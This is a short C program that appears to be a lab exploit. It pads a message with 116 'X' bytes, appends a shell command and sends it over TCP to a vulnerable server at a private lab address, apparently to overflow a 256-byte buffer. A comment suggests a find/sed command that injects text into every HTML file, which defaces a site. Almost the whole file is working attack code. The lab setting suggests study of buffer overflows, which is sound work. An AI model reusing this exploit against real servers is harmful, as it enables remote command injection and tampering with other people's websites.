#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <arpa/inet.h>


int main(int argc, char* argv[]) {
	
    //we should have a command in the input
    // the command is  should be "find . -name '*.html' -exec sed -i 's#</body>#<p>Oussama Ziat</p>&#' {} +"
	if (argc < 1) {
		printf("Syntax: %s <command>\n", argv[0]);
  		exit(1);
  	}
	//where we gonna store the command
	char *mycommand = argv[1];
	printf("My command: %s\n\n", mycommand);
	
    // 256 is the length of the buf in the source.c
	char msg[256];
	char *ptr = msg; // pointer to the first char of the message 
	memset(msg, 0, 256);
    //116 = 128(len(greeting_message) - len("Hello, dear "))
	for (int k = 0; k < 116; k++) {
		*(ptr + k) = 'X'; // always an X
	}
	*(ptr + 116) = '\0';
	strcat(msg, mycommand); 
	
	
	// Building destination addr_in where we gonna store the destination ip addr and the port number 
	struct sockaddr_in dest;
	dest.sin_family = AF_INET; //ipv4
	dest.sin_port = htons(1234); // port number 
	if (inet_pton(AF_INET, "192.168.56.101", &(dest.sin_addr)) != 1) printf("inet_pton error\n\n");
	for (int k = 0; k < 8; k++) dest.sin_zero[k] = 0;



	int sockfd = socket(AF_INET, SOCK_STREAM, 0);//ipv4 TCP socket 
	if (sockfd == -1) {
		printf("Error building socket");
  		exit(1);
  	}
	
	// Connecting
	if (connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr_in)) != 0) {
		printf("Failed to connect");
  		exit(1);
	}



	// Sending name
	if (send(sockfd, msg, strlen(msg), 0) != strlen(msg)) {
		printf("Failed to send message entirely");
  		exit(1);
	}
	

	
    return 0;
	
}